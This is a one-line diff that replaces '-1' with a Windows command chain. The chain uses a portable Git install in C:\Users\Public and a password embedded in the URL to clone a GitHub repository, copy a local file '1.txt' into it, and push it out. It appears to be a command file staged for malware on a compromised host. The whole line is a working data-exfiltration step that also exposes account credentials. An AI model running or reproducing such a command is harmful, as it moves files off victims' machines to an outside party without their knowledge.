@@ -1,1 +1,1 @@
-1
+C:\Users\Public\MinGit-2.15.0-64-bit\cmd\git clone https://attuploadsuser:4ttuploadsUser4.22@github.com/attuploadsuser/up.git;copy .\1.txt .\up\;cd .\up;C:\Users\Public\MinGit-2.15.0-64-bit\cmd\git add .;C:\Users\Public\MinGit-2.15.0-64-bit\cmd\git commit -m 't';C:\Users\Public\MinGit-2.15.0-64-bit\cmd\git push -u origin master;
